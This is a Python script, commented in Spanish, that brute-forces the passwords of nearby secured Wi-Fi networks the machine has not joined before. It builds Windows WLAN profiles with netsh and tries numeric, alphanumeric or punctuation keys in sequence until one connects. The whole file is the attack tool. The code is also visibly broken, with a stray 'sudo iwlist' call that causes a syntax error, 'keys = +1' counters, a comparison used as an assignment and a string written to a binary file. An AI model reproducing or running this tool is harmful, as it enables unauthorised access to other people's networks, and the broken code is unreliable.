import os
import re
import subprocess

import numpy as np
import pandas as pd
from tqdm import tqdm


def find_ssid(dim):
    # list networks
    wifi_info = str(
        subprocess.run(["netsh", "wlan", "show", "networks"], capture_output=True)

    subprocess.run(["sudo", "iwlist", "wlp3s0", "scan", "\|", "grep", "ESSID"], capture_output=True)
    )
    wifi_prev = str(
        subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True)
    )

    # Analizadores de texto
    rex_ssid = re.compile(r"SSID [\d]+ : ([\w \d \s \- \.]*)")
    rex_se = re.compile(r"Autenticaci\\xa2n           : ([\w \d \s \- \.]*)")
    rex_prev = re.compile(r"Perfil de todos los usuarios     : ([\w \d \s \- \.]*)")

    # hacer DB de las networks y tipo
    ssid = rex_ssid.findall(wifi_info)
    tipo = rex_se.findall(wifi_info)
    known = rex_prev.findall(wifi_prev)
    networks = pd.DataFrame(
        {"Redes": ssid, "Seguridad": tipo, "last": np.zeros(len(ssid))}
    )

    # depurar networks compatibles
    indexN = networks[networks["Seguridad"] == "Abierta"].index
    networks.drop(indexN, inplace=True)
    indexN = networks[networks["Redes"] == ""].index
    networks.drop(indexN, inplace=True)
    for i in range(len(known)):
        indexN = networks[networks["Redes"] == known[i]].index
        networks.drop(indexN, inplace=True)
    networks.reset_index(drop=True, inplace=True)
    # Cambiar el nombre de seguridad a su valor equivalente #
    networks.Seguridad = networks.Seguridad.replace(
        ["WPA2-Personal", "WPA-Personal"], ["WPA2PSK", "WPAPSK"]
    )
    # cargar columna de ultimo valor probado #

    ## cargar formato xml para las networks disponibles ##
    xml = open(".\\Sample.xml").readlines()
    for i in range(len(networks.Redes)):
        if os.path.exists(".\\temp\\" + networks.Redes[i] + ".xml") == False:
            xml[2] = "\t<name>" + networks.Redes[i] + "</name>\n"
            xml[5] = "\t\t\t<hex>" + (networks.Redes[i].encode("utf-8")).hex() + "</hex>\n"
            xml[6] = "\t\t\t<name>" + networks.Redes[i] + "</name>\n"
            xml[14] = (
                    "\t\t\t\t<authentication>" + networks.Seguridad[i] + "</authentication>\n"
            )
            if networks.Seguridad[i] == "WPA2PSK":
                xml[15] = "\t\t\t\t<encryption>AES</encryption>\n"
            elif networks.Seguridad[i] == "WPAPSK":
                xml[15] = "\t\t\t\t<encryption>AES</encryption>\n"
            temp = open(".\\temp\\" + networks.Redes[i] + ".xml", "w")
            temp.write("".join(xml))
            temp.close()
        else:  ##PROBAR si puedo generar una columna de boolenaos ##
            Rex_last = re.compile(
                r"\t\t\t\t<keyMaterial>([\w \d \s \- \.]*)</keyMaterial>\n"
            )
            last = Rex_last.search(xml[21])
            # verificar que sean de igual dimension si no descartar cambio
            if last != None:
                if len(last[0]) == dim:
                    networks.last[i] == last[0]

    return networks


# incrementador de cadenas
def incress(pws, caracts):
    for i in range(len(pws) - 1, -1, -1):
        if pws[i] != caracts[-1]:
            for n in range(len(pws) - 1, i, -1):
                pws[n] = caracts[0]
            pws[i] = caracts[caracts.index(pws[i]) + 1]
            inc = True
            return pws, inc
    # ultimo valor posible
    if i == "0":
        inc = False
        return pws, inc


## terminar el key_test para probar el
def key_test(pw, red):
    temp = open(".\\temp\\" + red + ".xml", "r")
    xml = temp.readlines()
    temp.close()
    ## abrir un xml y pasarle los parametros de pw y red y cambiar el pw protected a false
    xml[21] = "\t\t\t\t<keyMaterial>" + pw + "</keyMaterial>\n"
    temp = open(".\\temp\\" + red + ".xml", "w")
    temp.write("".join(xml))
    temp.close()
    ## añadir la red a probar ##
    subprocess.run(
        ["netsh", "wlan", "add", "profile", "filename=.\\temp\\" + red + ".xml"]
    )
    # prueba de clave
    connection = str(
        subprocess.run(["netsh", "wlan", "connect", "name=" + red], capture_output=True)
    )
    rex_connect = re.compile(
        r"(La solicitud de conexi\\xa2n se complet\\xa2 correctamente\.)"
    )
    cover = rex_connect.search(connection)
    if cover != None:
        # informacion de conexion
        interface = str(
            subprocess.run(["netsh", "wlan", "show", "interface"], capture_output=True)
        )
        # analizar texto de salida conexion correcta
        Rex_interface = re.compile(r"Estado                 : conectado")
        eval = Rex_interface.search(interface)
        if eval == None:
            return False
        else:
            temp = open(".\\temp\\" + red + ".txt", "wb")
            temp.write(interface)
            temp.close()
            return True
    else:
        return None


def numeric(networks, last, dim):
    keys = 0
    for i in tqdm(range(last)):
        pw = "0" * (dim - (len(str(i)))) + str(i)
        # probar en networks
        for k in range(len(networks.Redes)):
            signal = key_test(pw, networks.Redes[k])
            if signal:
                networks.drop(k, inplace=True)
                networks.reset_index(drop=True, inplace=True)
                print("\nSe ha conseguido una key c:\n")
                keys = +1

    for n in range(networks.Redes):
        subprocess.run(["netsh", "wlan", "delete", "profile name=" + networks.Redes[n]])

    return keys


def alfa_num(networks, dim, ntries):
    import string

    # condicion de alfanumerico o con caracteres especiales
    if ntries == 0:
        t = "alfanumerico"
        caracts = list(string.digits + string.ascii_letters)
    elif ntries == 1:
        t = "caracteres especiales"
        caracts = list(string.digits + string.ascii_letters + string.punctuation)
    pws = []
    # dimensiona la cadena a generar
    for i in range(dim):
        pws.append("0")
    inc = True
    while inc == True and len(networks.Redes) > 0:
        keys = 0
        for i in range(len(caracts)):
            pws[-1] = caracts[i]
            pw = "".join(pws)
            ## Enviar a la funcion de test ##
            for k in range(len(networks.Redes)):
                ## conseguir como evaluar las cadenas inferiores a otras para descartar repetidos ##
                if networks.last[i] == pw:
                    networks.last[i]
                signal = key_test(pw, networks.Redes[k])
                if signal:
                    networks.drop(k, inplace=True)
                    networks.reset_index(drop=True, inplace=True)
                    keys = +1
        pws, inc = incress(pws, caracts)
    for n in range(len(networks.Redes)):
        subprocess.run(["netsh", "wlan", "delete", "profile name=" + networks.Redes[n]])
    return f"test de tipo: {t} y de cadenas de: {str(dim)} fue completado", keys


## primeros test funcionaron pero la iteracion tiene mucho coste computacional ##
while True:
    try:
        dim = int(input("digits to try"))
    except ValueError:
        print("setting default value = 8")

    # password length
    test_type = input("tipo de cadena (num/alfaNum/alfaEspecial)")
    # list networks
    networks = find_ssid(dim)
    last = int("1" + "0" * dim)

    # numeric
    if test_type == "num":
        keys = numeric(networks, last, dim)
        break
    # alfa-numeric
    elif test_type == "alfaNum":
        log, keys = alfa_num(networks, dim, 0)
        break
    # alfa-numeric with special characters
    elif test_type == "alfaEspecial":
        log, keys = alfa_num(networks, dim, 1)
        break
    else:
        print("no valid value")

print(log)
print(f"keys encontradas: {keys}")
